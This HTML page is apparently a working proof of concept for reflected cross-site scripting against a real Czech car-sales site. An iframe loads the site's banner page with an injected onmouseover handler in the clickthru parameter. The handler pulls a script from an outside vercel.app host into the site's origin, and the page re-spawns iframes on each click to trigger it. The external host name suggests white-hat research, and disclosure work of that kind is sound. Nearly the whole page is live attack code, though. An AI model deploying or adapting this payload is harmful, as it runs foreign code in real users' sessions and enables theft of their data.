<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body {
            margin: 0;
        }
        iframe {
            position: absolute;
            left: 0;
            top: 0;
            width: 298px;
            height: 94px;
        }
        overlay {
            display: block;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            position: absolute;
            left: 0;
            top: 0;
            z-index: 999;
            pointer-events: none;
        }
    </style>
</head>
<body>

<overlay></overlay>
<iframe scrolling="no" src="https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)" frameborder="0"></iframe>

<script>
    document.addEventListener("click", generateIframes);
    const w = window.innerWidth;
    const h = window.innerHeight;

    function generateIframes()
    {
        document.querySelectorAll("iframe").forEach(iframe => iframe.remove());
        createIframe(0, 0);
        createIframe(300, 300);
    }

    function createIframe(x, y) {
        const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
        const iframe = document.createElement("iframe");
        iframe.setAttribute("scrolling", "no");
        iframe.src = src;
        iframe.style.left = x + "px";
        iframe.style.top = y + "px";
        iframe.setAttribute("frameborder", "0");
        document.body.appendChild(iframe);
    }
</script>
</body>
</html>
